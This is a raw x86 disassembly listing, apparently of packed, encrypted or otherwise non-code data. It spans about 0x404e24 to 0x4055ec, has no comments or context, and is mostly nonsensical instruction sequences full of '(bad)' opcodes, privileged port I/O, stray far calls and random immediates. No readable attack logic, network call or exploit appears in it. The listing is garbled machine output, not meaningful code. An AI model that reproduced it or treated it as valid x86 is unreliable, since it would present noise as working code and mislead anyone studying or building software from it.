  404e24:	jo     0x404df1
  404e26:	(bad)  
  404e28:	mov    bl,dh
  404e2a:	fidiv  DWORD PTR [edx+edx*2+0x77a165ab]
  404e31:	xchg   ebp,eax
  404e32:	mov    esi,0x47272657
  404e37:	sbb    dh,BYTE PTR [edx-0x761197f0]
  404e3d:	fistp  QWORD PTR [ebx+eax*8]
  404e40:	loop   0x404e34
  404e42:	mov    ebx,0x5293df1d
  404e47:	and    BYTE PTR [eax-0xc],cl
  404e4a:	sbb    DWORD PTR [esi],ebp
  404e4c:	adc    BYTE PTR [eax],dl
  404e4e:	pop    es
  404e4f:	or     DWORD PTR [esi],ecx
  404e51:	sbb    eax,0xa133fb5e
  404e56:	xchg   esi,eax
  404e57:	pop    ebx
  404e58:	sub    al,cl
  404e5a:	aad    0xfe
  404e5c:	mov    ds:0x32960c92,al
  404e61:	mov    al,0xcc
  404e63:	mov    ch,0x6f
  404e65:	iret   
  404e66:	xchg   DWORD PTR [esi],ebx
  404e68:	int    0x64
  404e6a:	mov    eax,0x5179cebf
  404e6f:	add    BYTE PTR [edi+0x3389ab20],bh
  404e75:	in     eax,dx
  404e76:	sahf   
  404e77:	inc    esi
  404e78:	sbb    eax,0xf0799d1
  404e7d:	pushf  
  404e7e:	cli    
  404e7f:	sbb    al,0xe0
  404e81:	(bad)  
  404e83:	mov    esi,ebx
  404e85:	test   ebx,ecx
  404e87:	dec    edx
  404e88:	mov    ebp,0x7943a262
  404e8d:	dec    ebx
  404e8e:	sar    BYTE PTR [ebp+0x751e9614],0xa1
  404e95:	fiadd  DWORD PTR [esi+0x3327b99c]
  404e9b:	fs scas al,BYTE PTR es:[edi]
  404e9d:	aam    0x6a
  404e9f:	nop
  404ea0:	sbb    eax,0x833671d7
  404ea5:	lods   al,BYTE PTR ds:[esi]
  404ea6:	out    dx,eax
  404ea7:	cwde   
  404ea8:	mov    dl,0x49
  404eaa:	or     ah,BYTE PTR [ebp-0x1d9c7905]
  404eb0:	jp     0x404e5f
  404eb2:	mov    al,0xe0
  404eb4:	ins    DWORD PTR es:[edi],dx
  404eb5:	push   edx
  404eb6:	push   edx
  404eb7:	fptan  
  404eb9:	ja     0x404ec6
  404ebb:	push   esi
  404ebc:	mov    al,ds:0x43ebd255
  404ec1:	fist   DWORD PTR [ecx]
  404ec3:	mov    ecx,0x96f62550
  404ec8:	into   
  404ec9:	cwde   
  404eca:	fwait
  404ecb:	cli    
  404ecc:	sub    eax,0x3f82c5b4
  404ed1:	stos   BYTE PTR es:[edi],al
  404ed2:	rcr    BYTE PTR [ecx-0x6ac71c3f],0xd3
  404ed9:	in     al,dx
  404eda:	inc    edx
  404edb:	pop    ebp
  404edc:	retf   
  404edd:	in     eax,dx
  404ede:	xchg   edi,eax
  404edf:	xchg   ebx,eax
  404ee0:	pop    esi
  404ee1:	push   ebx
  404ee2:	test   BYTE PTR [ecx+0x3c],bl
  404ee5:	xchg   esi,eax
  404ee6:	pushf  
  404ee7:	or     esp,ecx
  404ee9:	push   ebp
  404eea:	arpl   WORD PTR [esi-0x1c],dx
  404eed:	jb     0x404f09
  404eef:	aam    0x55
  404ef1:	sub    BYTE PTR [esi],0xf8
  404ef4:	jb     0x404e9c
  404ef6:	outs   dx,DWORD PTR ds:[esi]
  404ef7:	inc    edi
  404ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef9:	push   ecx
  404efa:	push   es
  404efb:	push   eax
  404efc:	retf   0x60b0
  404eff:	and    al,0x31
  404f01:	ja     0x404f5b
  404f03:	hlt    
  404f04:	std    
  404f05:	ins    BYTE PTR es:[edi],dx
  404f06:	pop    ds
  404f07:	fild   WORD PTR [edx]
  404f09:	pop    es
  404f0a:	cli    
  404f0b:	lods   al,BYTE PTR ds:[esi]
  404f0c:	push   0xfffffff3
  404f0e:	lock shl DWORD PTR [edx+0x27],cl
  404f12:	cmp    eax,0x1cc936db
  404f17:	xlat   BYTE PTR ds:[ebx]
  404f18:	aas    
  404f19:	xchg   edi,eax
  404f1a:	push   ecx
  404f1b:	mov    ds:0xb1a3a3b4,al
  404f20:	out    0x66,al
  404f22:	js     0x404f29
  404f24:	les    eax,FWORD PTR [ecx]
  404f26:	popa   
  404f27:	int    0xac
  404f29:	test   eax,esp
  404f2b:	les    edx,FWORD PTR [esi]
  404f2d:	push   esi
  404f2e:	(bad)  
  404f2f:	mov    ecx,0x5f3bd88a
  404f34:	push   eax
  404f35:	push   cs
  404f36:	clc    
  404f37:	sub    ebp,DWORD PTR [ecx+0x7e]
  404f3a:	hlt    
  404f3b:	test   eax,0x6a658dba
  404f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f41:	dec    ebx
  404f42:	pop    esp
  404f43:	inc    ecx
  404f44:	test   BYTE PTR [ebp+eiz*1+0x72e8ce5b],cl
  404f4b:	lods   eax,DWORD PTR ds:[esi]
  404f4c:	ror    DWORD PTR [edi],0xee
  404f4f:	adc    ecx,DWORD PTR [esi+esi*8-0x6ea64e47]
  404f56:	and    BYTE PTR [ebx+0x53],bl
  404f59:	mov    eax,ds:0xa1e2903a
  404f5e:	adc    DWORD PTR [edx+0x4a212a69],ecx
  404f64:	ret    0x359a
  404f67:	pushf  
  404f68:	ins    DWORD PTR es:[edi],dx
  404f69:	sub    DWORD PTR [ecx-0x78590411],edi
  404f6f:	addr16 xor al,0x6c
  404f72:	outs   dx,DWORD PTR ds:[esi]
  404f73:	into   
  404f74:	in     al,0xcd
  404f76:	into   
  404f77:	mov    cs,WORD PTR [edx+0x2f]
  404f7a:	adc    eax,0x594d6d7f
  404f7f:	and    esi,esi
  404f81:	adc    ah,BYTE PTR [esi+0x301dd0c7]
  404f87:	int    0xdb
  404f89:	arpl   WORD PTR [edi+0x77],ax
  404f8c:	xlat   BYTE PTR ds:[ebx]
  404f8d:	in     al,0x86
  404f8f:	sbb    BYTE PTR [ecx+0x5313ee82],bh
  404f95:	push   esp
  404f96:	sbb    al,0x9
  404f98:	dec    eax
  404f99:	mov    DWORD PTR [ecx+0x55ff90c9],esi
  404f9f:	sbb    eax,0x1fbe6c26
  404fa4:	push   cs
  404fa5:	idiv   DWORD PTR [edx]
  404fa7:	jp     0x405023
  404fa9:	mov    ah,0xd7
  404fab:	jg     0x404f94
  404fad:	test   al,0x1b
  404faf:	aaa    
  404fb0:	fdivr  DWORD PTR [edi]
  404fb2:	dec    esi
  404fb3:	mov    eax,0x54e17b09
  404fb8:	add    DWORD PTR [ebx],esi
  404fba:	imul   edx,DWORD PTR [edx-0x12],0x1ac3e386
  404fc1:	jns    0x404f68
  404fc3:	sbb    dh,dl
  404fc5:	ror    DWORD PTR [ecx+0x48],cl
  404fc8:	mov    bh,0xfa
  404fca:	ja     0x40500c
  404fcc:	xchg   edx,eax
  404fcd:	push   ebx
  404fce:	leave  
  404fcf:	push   es
  404fd0:	or     eax,0xdce9e33c
  404fd5:	mov    edx,0x7f78e77a
  404fda:	dec    esi
  404fdb:	inc    eax
  404fdc:	sub    al,BYTE PTR [eax+0x7]
  404fdf:	or     DWORD PTR [ebx+0x1a3055a0],esi
  404fe5:	test   BYTE PTR [edx-0x4444b3e5],0x15
  404fec:	and    DWORD PTR [ecx+0x70],edx
  404fef:	aad    0xb1
  404ff1:	jnp    0x405011
  404ff3:	daa    
  404ff4:	out    0xef,al
  404ff6:	mov    al,0xd8
  404ff8:	es in  eax,0xb9
  404ffb:	push   edi
  404ffc:	loopne 0x40506e
  404ffe:	aam    0xaa
  405000:	jbe    0x404f82
  405002:	adc    eax,0xc88b7287
  405007:	sbb    dl,dl
  405009:	jge    0x405002
  40500b:	dec    esi
  40500d:	mov    bl,0x9a
  40500f:	jb     0x405046
  405011:	pop    edi
  405012:	hlt    
  405013:	(bad)  
  405016:	and    DWORD PTR [ecx-0x500922e9],ebp
  40501c:	xor    eax,0xc99e6d73
  405021:	aam    0x10
  405023:	repz jnp 0x40506a
  405026:	sub    DWORD PTR [ecx+0xd],edx
  405029:	mov    edi,0xe66cec3c
  40502e:	cmp    al,0x71
  405030:	jbe    0x405045
  405032:	inc    ebx
  405033:	cwde   
  405034:	ret    0xc502
  405037:	in     ax,dx
  405039:	jno    0x405019
  40503b:	lea    ecx,[esi]
  40503d:	hlt    
  40503e:	sbb    DWORD PTR [eax-0x44ff8f8a],ebp
  405044:	push   ds
  405045:	call   0xec13:0x24776c3f
  40504c:	inc    ebp
  40504d:	mov    bh,0xf5
  40504f:	push   esp
  405050:	test   BYTE PTR [edi],cl
  405052:	jno    0x4050b2
  405054:	into   
  405055:	sar    ebp,0x5e
  405058:	and    eax,DWORD PTR [ebp*1+0x24938c8e]
  40505f:	or     edi,ebp
  405061:	test   BYTE PTR [ecx+0x7991ab8a],dh
  405067:	(bad)  
  405068:	iret   
  405069:	push   es
  40506a:	mov    edi,0x2ece70cf
  40506f:	jnp    0x4050a9
  405071:	push   edi
  405072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405073:	pop    ebp
  405074:	pop    es
  405075:	jmp    0x405077
  405077:	jg     0x4050f2
  405079:	adc    al,0x55
  40507b:	aam    0xb4
  40507d:	idiv   al
  40507f:	push   esi
  405080:	mov    bh,al
  405082:	clc    
  405083:	jo     0x405050
  405085:	(bad)  
  405086:	push   ds
  405087:	mov    cl,0x6c
  405089:	mov    WORD PTR [edx],?
  40508b:	rcl    esi,cl
  40508d:	add    DWORD PTR [ecx+0x27],eax
  405090:	enter  0x25af,0x99
  405094:	add    BYTE PTR [edx+0x46e7ec69],al
  40509a:	or     ebp,DWORD PTR [eax-0xc6a2ba2]
  4050a0:	jl     0x40506b
  4050a2:	and    esi,esi
  4050a4:	jle    0x405075
  4050a6:	out    0x8,al
  4050a8:	ficom  WORD PTR [edx-0x70]
  4050ab:	and    bl,dh
  4050ad:	jb     0x405098
  4050af:	jo     0x40506d
  4050b1:	add    ah,BYTE PTR [esi+0x24]
  4050b4:	add    ecx,DWORD PTR [eax-0x72]
  4050b7:	sbb    DWORD PTR [ebx],esp
  4050b9:	dec    ebp
  4050ba:	xor    edi,DWORD PTR [ecx+0x48e4dfad]
  4050c0:	jo     0x40508b
  4050c2:	jnp    0x405113
  4050c4:	xor    eax,0x957fa156
  4050c9:	or     BYTE PTR [esi+0x4ffe5803],bh
  4050cf:	dec    ecx
  4050d0:	pop    esp
  4050d1:	mov    DWORD PTR ds:0xb4fb2b8c,ebp
  4050d7:	mov    esi,0x37d1ba3e
  4050dc:	cli    
  4050dd:	dec    esi
  4050de:	outs   dx,BYTE PTR ds:[esi]
  4050df:	add    edi,esi
  4050e1:	adc    ebp,DWORD PTR [ebp+0x1f]
  4050e4:	mov    ecx,0xa006484c
  4050e9:	js     0x40512f
  4050eb:	mov    dl,0x9e
  4050ed:	dec    ecx
  4050ee:	jp     0x4050e8
  4050f0:	cmp    cl,BYTE PTR gs:[ebx+eiz*1+0x47]
  4050f5:	sub    DWORD PTR [ebx+0x79],ebx
  4050f8:	outs   dx,BYTE PTR ds:[esi]
  4050f9:	push   edx
  4050fa:	inc    ecx
  4050fb:	push   cs
  4050fc:	dec    edi
  4050fd:	cwde   
  4050fe:	jg     0x4050ba
  405100:	es gs int 0x42
  405104:	adc    eax,DWORD PTR ds:0xfcfde857
  40510a:	cs dec ebp
  40510c:	jl     0x4050a0
  40510e:	xlat   BYTE PTR ds:[ebx]
  40510f:	jae    0x4050f7
  405111:	mov    edi,0x5f4ddddd
  405116:	imul   ecx,DWORD PTR [esi-0x5fc9cb8f],0x7eee72ba
  405120:	ss (bad) 
  405122:	out    0xfb,eax
  405124:	inc    eax
  405125:	cli    
  405126:	mov    cl,0xbb
  405128:	or     DWORD PTR [edx+0x6bdbc98d],ecx
  40512e:	(bad)  
  40512f:	aam    0xe0
  405131:	repnz dec esi
  405133:	pop    ecx
  405134:	in     al,dx
  405135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405136:	fst    DWORD PTR [edi-0x29e63f37]
  40513c:	xchg   edi,eax
  40513d:	push   edi
  40513e:	xchg   ecx,eax
  40513f:	inc    eax
  405140:	or     al,0xc8
  405142:	and    ecx,esi
  405144:	mov    esp,0x2978a695
  405149:	lods   al,BYTE PTR ds:[esi]
  40514a:	sti    
  40514b:	push   ds
  40514c:	pop    ebp
  40514d:	cmp    ch,BYTE PTR [edx]
  40514f:	or     eax,0x7b7dc81f
  405154:	je     0x4050df
  405156:	popf   
  405157:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405159:	xor    DWORD PTR [eax],ebp
  40515b:	fnstcw WORD PTR [ebx+0x511f120a]
  405161:	push   0xffffff9f
  405163:	sti    
  405164:	dec    ebx
  405165:	nop
  405166:	jns    0x4051e6
  405168:	inc    ebx
  405169:	adc    esp,DWORD PTR [edx]
  40516b:	mov    al,0xd7
  40516d:	ror    BYTE PTR ds:0x4e677417,0x9
  405174:	push   ebx
  405175:	and    al,0x4d
  405177:	test   eax,0xc8f27131
  40517c:	mov    bh,0xa3
  40517e:	xlat   BYTE PTR ds:[ebx]
  40517f:	and    DWORD PTR [eax-0x3472427e],esp
  405185:	push   ebx
  405186:	adc    DWORD PTR [esi-0x58],esi
  405189:	mov    cl,0x3e
  40518b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40518c:	pushf  
  40518d:	xor    eax,0x97a3e54c
  405192:	stc    
  405193:	cmp    al,0xf1
  405195:	xchg   bh,bl
  405197:	mov    fs,eax
  405199:	fs jne 0x40511e
  40519c:	jl     0x4051d2
  40519e:	loopne 0x405178
  4051a0:	adc    DWORD PTR [ebp+ecx*4-0x62],ebx
  4051a4:	fdiv   QWORD PTR [edx+0x369878c2]
  4051aa:	mov    ebp,0x82a58f3e
  4051af:	bt     ebx,ebx
  4051b2:	jle    0x4051d4
  4051b4:	sar    BYTE PTR [edi+ebp*1+0x2135e99e],1
  4051bb:	aad    0xfb
  4051bd:	mov    cl,0xf4
  4051bf:	shr    DWORD PTR [edx-0x28],cl
  4051c2:	not    DWORD PTR [ebp+esi*8-0x6c2055bf]
  4051c9:	push   esi
  4051ca:	xchg   ebp,eax
  4051cb:	stos   DWORD PTR es:[edi],eax
  4051cc:	and    DWORD PTR [ebx-0x1c],edi
  4051cf:	lahf   
  4051d0:	adc    al,0x39
  4051d2:	mov    eax,ds:0xba24418b
  4051d7:	and    al,0x95
  4051d9:	inc    ecx
  4051da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051db:	mov    edx,DWORD PTR [ebp+0x1a]
  4051de:	xchg   edx,eax
  4051df:	sbb    ebx,DWORD PTR [ecx+edi*4]
  4051e2:	jl     0x4051fb
  4051e4:	fld    DWORD PTR [edx-0x26]
  4051e7:	sub    BYTE PTR [ebp-0x65fe619e],bl
  4051ed:	inc    esp
  4051ee:	adc    DWORD PTR [ecx-0x1e],ebx
  4051f1:	mov    BYTE PTR ds:0x4349c269,ah
  4051f7:	or     eax,0x578452a2
  4051fc:	shl    DWORD PTR [ecx+0x52d68bf9],0xd0
  405203:	cs retf 0x1bf1
  405207:	jle    0x4051fb
  405209:	xchg   esp,eax
  40520a:	xchg   ebx,eax
  40520b:	cli    
  40520c:	ds stc 
  40520e:	xor    esp,DWORD PTR [ebp-0x26]
  405211:	outs   dx,DWORD PTR ds:[esi]
  405212:	into   
  405213:	or     dl,0x9b
  405216:	or     BYTE PTR [ebx],0xb3
  405219:	xor    bl,BYTE PTR [ecx+0x6]
  40521c:	and    DWORD PTR [ebx],esp
  40521e:	in     eax,0x83
  405220:	call   DWORD PTR [ecx]
  405222:	pusha  
  405223:	in     eax,dx
  405224:	ins    BYTE PTR es:[edi],dx
  405225:	or     bh,BYTE PTR [ebx]
  405227:	jno    0x405232
  405229:	jb     0x4051cc
  40522b:	enter  0x4652,0x22
  40522f:	push   ebp
  405230:	jmp    0xdda57852
  405235:	xor    dl,bl
  405237:	mov    ah,0x3f
  405239:	into   
  40523a:	inc    eax
  40523b:	jno    0x4051c3
  40523d:	inc    esp
  40523e:	and    eax,ecx
  405240:	scas   al,BYTE PTR es:[edi]
  405241:	ror    BYTE PTR [edx-0x42],0x24
  405245:	mov    ds:0x25058fac,eax
  40524a:	inc    ecx
  40524b:	jle    0x4051ef
  40524d:	dec    edi
  40524e:	xor    al,0x7
  405250:	bound  ebx,QWORD PTR [edi+ecx*1+0x7a]
  405254:	sbb    edx,DWORD PTR [esi-0x6a855dbb]
  40525a:	cmp    BYTE PTR [esi-0x8],cl
  40525d:	ins    BYTE PTR es:[edi],dx
  40525e:	sbb    bl,BYTE PTR [ecx-0x19a2ac08]
  405264:	pop    ebp
  405265:	and    eax,0x7dc106e1
  40526a:	mov    ds:0x2b521070,eax
  40526f:	sbb    DWORD PTR [esi-0x5ef14ee6],esi
  405275:	mov    ebx,0x18a46f17
  40527a:	je     0x4052eb
  40527c:	loop   0x40523d
  40527e:	xchg   edx,eax
  40527f:	sub    eax,ebx
  405281:	add    esi,esp
  405283:	xchg   esi,eax
  405284:	shr    DWORD PTR [esi],cl
  405286:	fs popa 
  405288:	fsubp  st(1),st
  40528a:	cmc    
  40528b:	hlt    
  40528c:	(bad)  
  40528d:	mov    cl,0x77
  40528f:	scas   al,BYTE PTR es:[edi]
  405290:	imul   ecx,DWORD PTR [edi],0x45
  405293:	mov    dh,0xd4
  405295:	ins    BYTE PTR es:[edi],dx
  405296:	ja     0x4052f7
  405298:	mov    eax,0x6e4cebc7
  40529d:	and    ebx,DWORD PTR [ebp+0x387bc62]
  4052a3:	pop    edi
  4052a4:	jl     0x405295
  4052a6:	bound  eax,QWORD PTR [edx-0x2]
  4052a9:	mov    dl,0xa6
  4052ab:	stc    
  4052ac:	mov    edx,DWORD PTR [eax]
  4052ae:	pop    ss
  4052af:	cwde   
  4052b0:	mov    WORD PTR [esi],cs
  4052b2:	nop
  4052b3:	cwde   
  4052b4:	xchg   ebp,eax
  4052b5:	(bad)
  4052b8:	arpl   WORD PTR [edx],ax
  4052ba:	mov    edi,0x55f23d91
  4052bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052c0:	jle    0x40526e
  4052c2:	jmp    0x4052af
  4052c4:	cmp    BYTE PTR [ebp-0x26a75367],0x9d
  4052cb:	rol    BYTE PTR ds:0xd0e0b3cc,1
  4052d1:	pushf  
  4052d2:	xchg   edx,eax
  4052d3:	repnz sti 
  4052d5:	jns    0x4052d3
  4052d7:	mov    dl,0xec
  4052d9:	dec    ebp
  4052da:	pop    ss
  4052db:	or     al,0x8b
  4052dd:	nop
  4052de:	call   0x9f9fb0fc
  4052e3:	and    eax,0x82fe381d
  4052e8:	loope  0x405331
  4052ea:	addr16 shl ebx,1
  4052ed:	imul   DWORD PTR [edi-0x6d8895b6]
  4052f3:	lds    ebp,FWORD PTR [edi-0x685333a0]
  4052f9:	aaa    
  4052fa:	popa   
  4052fb:	arpl   WORD PTR [edi-0x1f],cx
  4052fe:	and    BYTE PTR [eax+0x1c580713],bh
  405304:	jmp    0x4052c9
  405306:	mov    ebp,0x4418280b
  40530b:	icebp  
  40530c:	sbb    edx,DWORD PTR ds:0xc5d49108
  405312:	xchg   ebx,eax
  405313:	mov    ?,WORD PTR [edx+eax*2+0x3a]
  405317:	mov    ch,0x70
  405319:	xlat   BYTE PTR ds:[ebx]
  40531a:	inc    ebp
  40531b:	jmp    0xda4b:0xd7f9a495
  405322:	add    ecx,DWORD PTR [ecx+ebx*4]
  405325:	pusha  
  405326:	lock cld 
  405328:	pop    ebp
  405329:	les    eax,FWORD PTR [ebx]
  40532b:	dec    esi
  40532c:	lahf   
  40532d:	leave  
  40532e:	into   
  40532f:	mov    es,WORD PTR [edx]
  405331:	or     eax,0x9d24d4b1
  405336:	(bad)  
  405337:	push   0x5c
  405339:	mov    BYTE PTR [ecx+0x4a0a7ab0],0xe8
  405340:	les    edx,FWORD PTR [ecx]
  405342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405343:	(bad)  
  405344:	(bad)  
  405345:	mov    esi,0xbcc76dd9
  40534a:	bound  esi,QWORD PTR [esi+0x18]
  40534d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534e:	(bad)  
  40534f:	jp     0x4053ac
  405351:	mov    ebp,0x4e205821
  405356:	push   ds
  405357:	std    
  405358:	adc    DWORD PTR ds:0x21555515,esi
  40535e:	pop    ecx
  40535f:	imul   eax,DWORD PTR [ebx-0xef8eacc],0xffffffe9
  405366:	ror    ecx,0xf3
  405369:	out    0x4c,eax
  40536b:	inc    ebp
  40536c:	mov    edi,0x879a2b49
  405371:	inc    edx
  405372:	test   BYTE PTR [eax+ebp*8],al
  405375:	jb     0x40533f
  405377:	call   0xbc0a:0xd521f5cf
  40537e:	inc    ecx
  40537f:	stos   BYTE PTR es:[edi],al
  405380:	pop    ds
  405381:	and    al,0x37
  405383:	aaa    
  405384:	add    DWORD PTR [eax],0xc1e99e66
  40538a:	add    esp,DWORD PTR [edi+0x6b]
  40538d:	add    ecx,DWORD PTR ds:0x25687a71
  405393:	out    0xed,al
  405395:	pop    ebx
  405396:	in     al,dx
  405397:	mov    bh,0x25
  405399:	sbb    DWORD PTR [eax],0x853a8539
  40539f:	fpatan 
  4053a1:	aad    0x9e
  4053a3:	(bad)  
  4053a4:	mov    edi,0xf7d1f119
  4053a9:	dec    ebp
  4053aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ab:	sbb    eax,0xd185a75d
  4053b0:	pop    edi
  4053b1:	into   
  4053b2:	rcr    cl,0x35
  4053b5:	pop    ecx
  4053b6:	mov    ebx,0x4e9f5f37
  4053bb:	fdivr  st(4),st
  4053bd:	cmp    BYTE PTR [ebp-0x45],cl
  4053c0:	xchg   edx,eax
  4053c1:	shl    al,0x99
  4053c4:	js     0x4053dd
  4053c6:	mov    bl,0x18
  4053c8:	mov    ds:0xe003a850,al
  4053cd:	test   al,0x40
  4053cf:	add    DWORD PTR [edx-0xec16054],ebx
  4053d5:	(bad)  
  4053d7:	adc    BYTE PTR ds:0xaa7babfc,0x99
  4053de:	call   0x354f94a9
  4053e3:	icebp  
  4053e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053e5:	sub    bh,dh
  4053e7:	pop    esp
  4053e8:	or     BYTE PTR [eax-0x3d],ah
  4053eb:	xor    esi,edi
  4053ed:	mov    esi,0x6ec2ec3a
  4053f2:	pushf  
  4053f3:	ret    
  4053f4:	push   cs
  4053f5:	repz xchg ebx,eax
  4053f7:	mov    esp,DWORD PTR [eax+0x6e]
  4053fa:	shl    DWORD PTR [ebp-0x4a5f09f1],0xde
  405401:	loopne 0x4053de
  405403:	cmp    al,0x98
  405405:	imul   ebp,DWORD PTR [edx],0xffffffec
  405408:	add    dh,bl
  40540a:	test   BYTE PTR [edi+0x4b],al
  40540d:	cmp    eax,0x93acaa8f
  405412:	push   ds
  405413:	mov    ds:0x51bf497d,al
  405418:	dec    edx
  405419:	fs cli 
  40541b:	loop   0x4053dc
  40541d:	mov    WORD PTR [esi-0x72bf8c6c],ss
  405423:	and    DWORD PTR [edx-0x6247f167],esi
  405429:	push   ecx
  40542a:	pop    ecx
  40542b:	mov    dh,BYTE PTR fs:[edi]
  40542e:	or     eax,0x40fb679e
  405433:	pop    eax
  405434:	pop    eax
  405435:	xchg   ebp,eax
  405436:	or     eax,0x7534488a
  40543b:	aas    
  40543c:	fadd   QWORD PTR [esi+0x7b]
  40543f:	push   eax
  405440:	js     0x4053f1
  405442:	cmp    DWORD PTR [ebx-0x74cf926e],0x21
  405449:	lahf   
  40544a:	mov    esi,0xb52e6731
  40544f:	push   es
  405450:	sub    BYTE PTR [edx+0x21],0xc3
  405454:	(bad)  
  405455:	jl     0x4053e2
  405457:	ins    BYTE PTR es:[edi],dx
  405458:	popa   
  405459:	cmp    bl,BYTE PTR [eax+edi*4-0x212ce1c0]
  405460:	enter  0x9a66,0x7a
  405464:	push   ebp
  405465:	js     0x4054c2
  405467:	rcl    dl,0x40
  40546a:	cmp    DWORD PTR [edi],0xffffff81
  40546d:	mov    esp,0x2054dca0
  405472:	jmp    0xceb622f2
  405477:	call   0x78e25110
  40547c:	pushf  
  40547d:	shr    DWORD PTR [edi+0x6d],1
  405480:	mov    ebx,0xbe63ab84
  405485:	mov    ah,0x7f
  405487:	mov    edx,0xec989dc5
  40548c:	mov    ah,0x24
  40548e:	jecxz  0x405476
  405490:	ror    BYTE PTR [esi-0x21],0xca
  405494:	das    
  405495:	xchg   ecx,eax
  405496:	loopne 0x40541c
  405498:	pop    ecx
  405499:	int    0x12
  40549b:	arpl   WORD PTR [edi+0x514c89e3],ax
  4054a1:	cmp    eax,0x161bf9f6
  4054a6:	mov    esi,0xad1280ef
  4054ab:	test   eax,0xbc707686
  4054b0:	cli    
  4054b1:	push   ebp
  4054b2:	jmp    DWORD PTR [ebp+0x2b37c8d8]
  4054b8:	es leave 
  4054ba:	jl     0x40551e
  4054bc:	sub    al,0x30
  4054be:	push   ebx
  4054bf:	sbb    cl,BYTE PTR [edx+ebx*4+0x6e]
  4054c3:	daa    
  4054c4:	mul    DWORD PTR [eax+0x7b]
  4054c7:	sbb    DWORD PTR [eax-0x36865caa],esi
  4054cd:	xchg   BYTE PTR [ebp+0x2c210956],dh
  4054d3:	cld    
  4054d4:	popf   
  4054d5:	inc    ebp
  4054d6:	(bad)  
  4054d7:	fist   WORD PTR [eax+edi*1-0x4e]
  4054db:	jmp    0x4054c8
  4054dd:	jnp    0x4054ca
  4054df:	hlt    
  4054e0:	xchg   edx,eax
  4054e1:	mov    ah,0xbf
  4054e3:	mov    ebx,0xf1bc01a9
  4054e8:	jns    0x4054c5
  4054ea:	dec    ebp
  4054eb:	sbb    esp,edx
  4054ed:	dec    edi
  4054ee:	cmp    ah,BYTE PTR [ecx-0x48]
  4054f1:	mov    edx,0xc8b2bbbd
  4054f6:	jg     0x4054a4
  4054f8:	lea    eax,[ecx]
  4054fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054fb:	push   es
  4054fc:	jl     0x405564
  4054fe:	stos   DWORD PTR es:[edi],eax
  4054ff:	pusha  
  405500:	enter  0xa987,0xc9
  405504:	mov    ebp,0xe5f70db1
  405509:	mov    esp,0xf5d92a3f
  40550e:	(bad)  
  40550f:	jle    0x40556e
  405511:	scas   al,BYTE PTR es:[edi]
  405512:	jno    0x4054d8
  405514:	jno    0x405566
  405516:	xchg   edi,eax
  405517:	retf   0x8778
  40551a:	ss mov al,gs:0x1ca436f4
  405521:	jno    0x405555
  405523:	ins    DWORD PTR es:[edi],dx
  405524:	ret    
  405525:	(bad)  
  405526:	pop    esp
  405527:	shr    BYTE PTR [eax-0x15],cl
  40552a:	adc    cl,bh
  40552c:	sub    eax,0xf9e126d6
  405531:	xor    al,0x36
  405533:	jl     0x4054c6
  405535:	int3   
  405536:	(bad)  
  405537:	push   0xffffffac
  405539:	sub    edi,DWORD PTR [ecx+eax*1]
  40553c:	push   ss
  40553d:	lock leave 
  40553f:	int    0x47
  405541:	sub    eax,0xbf16c872
  405546:	fist   WORD PTR [ebx+0x45e1ded1]
  40554c:	in     eax,dx
  40554d:	push   ebp
  40554e:	or     dl,BYTE PTR [ebp-0x78]
  405551:	push   0xfffffffb
  405553:	stos   BYTE PTR es:[edi],al
  405554:	mov    DWORD PTR [ebx+0x40],esi
  405557:	jno    0xf3cede9
  40555d:	je     0x4055ba
  40555f:	ret    0x1db6
  405562:	dec    esi
  405563:	add    DWORD PTR [edx],ebp
  405565:	mov    ah,ah
  405567:	repz or DWORD PTR [ecx],esp
  40556a:	dec    esp
  40556b:	cdq    
  40556c:	sbb    eax,0xe6addc4b
  405571:	adc    DWORD PTR [edx],ebp
  405573:	in     al,0x66
  405575:	addr16 and ah,dl
  405578:	pop    ds
  405579:	(bad)  
  40557b:	rol    BYTE PTR [esi-0x3],1
  40557e:	or     eax,0xe64d8bc1
  405583:	or     DWORD PTR [edx-0x3097a5ff],0xffffff8a
  40558a:	and    bh,BYTE PTR [edi]
  40558c:	dec    edx
  40558d:	xchg   ecx,eax
  40558e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405590:	stos   DWORD PTR es:[edi],eax
  405591:	mov    bh,0x38
  405593:	jmp    0x40e05972
  405598:	mov    edi,0x4884c4f5
  40559d:	bnd js 0x4055bd
  4055a0:	aam    0xdb
  4055a2:	adc    al,0xb0
  4055a4:	adc    dh,BYTE PTR [esi-0x41]
  4055a7:	retf   
  4055a8:	mov    ds:0xe0952994,al
  4055ad:	fcom   QWORD PTR [eax-0x3]
  4055b0:	in     al,dx
  4055b1:	in     al,dx
  4055b2:	and    ebp,ecx
  4055b4:	sub    BYTE PTR [eax],ch
  4055b6:	mov    ds:0x6cb484a7,eax
  4055bb:	pop    edi
  4055bc:	pop    ecx
  4055bd:	push   es
  4055be:	aas    
  4055bf:	scas   eax,DWORD PTR es:[edi]
  4055c0:	shl    BYTE PTR ds:0x1e394b46,0xc1
  4055c7:	xchg   edi,eax
  4055c8:	jp     0x4055f2
  4055ca:	cld    
  4055cb:	mov    ah,0x8f
  4055cd:	pop    esp
  4055ce:	popa   
  4055cf:	jle    0x405566
  4055d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055d2:	adc    ebx,0x2ba0ef91
  4055d8:	(bad)  
  4055d9:	aad    0x38
  4055db:	clc    
  4055dc:	add    BYTE PTR [ecx],bh
  4055de:	shl    DWORD PTR [ebx],cl
  4055e0:	jbe    0x4055c2
  4055e2:	and    DWORD PTR gs:[eax-0x5466dd33],ebx
  4055e9:	inc    esp
  4055ea:	icebp  
  4055eb:	stc    
  4055ec:	xor    DWORD PTR [edx],eax
